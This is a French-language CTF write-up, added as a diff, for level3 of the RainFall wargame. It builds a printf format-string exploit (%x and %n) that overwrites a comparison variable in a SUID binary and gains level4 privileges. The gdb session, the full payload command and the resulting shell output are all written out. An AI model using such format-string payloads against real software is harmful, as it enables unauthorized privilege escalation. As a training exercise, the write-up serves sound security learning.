@@ -1,0 +1,42 @@
+Connextion au level3 -> Bit NX desactive
+Chech du home et des permissions du binaire -> Bit SUID level4
+Exection du binaire -> attente d'ecriture sur l'entree standard et reaffichage de la chaine sur la sortie (echo like)
+
+"""
+level3@Rainfaill:~$ ./level3
+abc
+abc
+"""
+
+Reecriture du code source en utilisant objdump -d et gdb avec peda
+
+Recherche d'exploit buffer overflow printf sur google ->
+https://resources.infosecinstitute.com/topic/buffer-overflow-format-string-attacks-basics-part-2/
+
+0x080484da <+54>:	mov    0x804988c,%eax
+0x080484df <+59>:	cmp    $0x40,%eax
+
+0x804988c -> Adresse de comparaison avec 0x40
+"%x" * 3 -> offset vers le dernier octet de la "variable"
+"%n" -> force le printf a ecrire le nombre de caractere affiche precedemment a l'adresse cible
+
+gdb-peda$ r < <(python -c 'print "\x8c\x98\x04\x08" + "%x"*3 + "%n"')
+gdb-peda$ x/d 0x804988c
+0x804988c <m>:	23
+
+Nous avons reussi a change la valeur mais ce n'est pas celle attendu par la comparaison (0x40 -- 64 en decimal)
+
+Il faut alors ajouter 41 caracteres (64 = 23 + 41)
+
+payload :
+'print "\x8c\x98\x04\x08" + "\x40" * 41 + "%x"*3 + "%n"'
+
+execution :
+level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "\x40" * 41 + "%x"*3 + "%n"' > /tmp/c && cat /tmp/c - | ./level3
+�@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@200b7fd1ac0b7ff37d0
+Wait what?!
+id
+uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
+cd /home/user/level4
+pwd
+/home/user/level4
